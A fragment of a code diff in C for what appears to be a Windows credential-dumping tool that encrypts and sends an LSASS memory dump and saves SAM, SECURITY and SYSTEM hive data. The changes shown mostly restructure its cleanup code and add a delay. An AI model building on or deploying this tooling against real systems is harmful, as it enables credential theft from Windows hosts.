@@ -806,6 +806,9 @@ ProcessDumps:
 					_getch();
 				}
 			}
+			else {
+				Sleep(standardDelay);
+			}
 #ifdef DEBUG
 			printf("[i] Sending Encrypted LSASS Dump...\n");
 			fflush(stdout);
@@ -873,44 +876,44 @@ SaveToLocal:
 			WriteToFile(pSecurityData, dwSecuritySize, securitySavePath, TRUE);
 			WriteToFile(pSystemData, dwSystemSize, systemSavePath, TRUE);
 		}
-		PrintKey(rc4Key, RC4KEYSIZE);
+	}
+	PrintKey(rc4Key, RC4KEYSIZE);
 
 ErrorCleanUp:
-		FileExistsAndDelete(args.tempDmpPath, TRUE);
+	FileExistsAndDelete(args.tempDmpPath, TRUE);
 
-		if (args.procDumpMode) {
-			for (retryCount = 0; retryCount < 20; retryCount++) {
-				if (FileExistsAndDelete(args.procDumpPath, TRUE)) {
-					break;
-				}
-				else {
-					Sleep(100);
-				}
+	if (args.procDumpMode) {
+		for (retryCount = 0; retryCount < 20; retryCount++) {
+			if (FileExistsAndDelete(args.procDumpPath, TRUE)) {
+				break;
 			}
+			else {
+				Sleep(100);
+			}
+		}
 
-			if (retryCount == 20) {
+		if (retryCount == 20) {
 #ifdef DEBUG
-				printf("[!] Failed to Delete %s\n", args.procDumpPath);
+			printf("[!] Failed to Delete %s\n", args.procDumpPath);
 #endif // DEBUG
-			}
 		}
-
-		if (pDumpData != NULL) {
-			HeapFree(GetProcessHeap(), 0, pDumpData);
-		}
-		if (pSamData != NULL) {
-			HeapFree(GetProcessHeap(), 0, pSamData);
-		}
-		if (pSecurityData != NULL) {
-			HeapFree(GetProcessHeap(), 0, pSecurityData);
-		}
-		if (pSystemData != NULL) {
-			HeapFree(GetProcessHeap(), 0, pSystemData);
-		}
-		free(args.procDumpPath);
-		free(args.localDmpPath);
-		free(args.tempDmpPath);
-
-		exit(EXIT_FAILURE);
 	}
+
+	if (pDumpData != NULL) {
+		HeapFree(GetProcessHeap(), 0, pDumpData);
+	}
+	if (pSamData != NULL) {
+		HeapFree(GetProcessHeap(), 0, pSamData);
+	}
+	if (pSecurityData != NULL) {
+		HeapFree(GetProcessHeap(), 0, pSecurityData);
+	}
+	if (pSystemData != NULL) {
+		HeapFree(GetProcessHeap(), 0, pSystemData);
+	}
+	free(args.procDumpPath);
+	free(args.localDmpPath);
+	free(args.tempDmpPath);
+
+	exit(EXIT_FAILURE);
 }
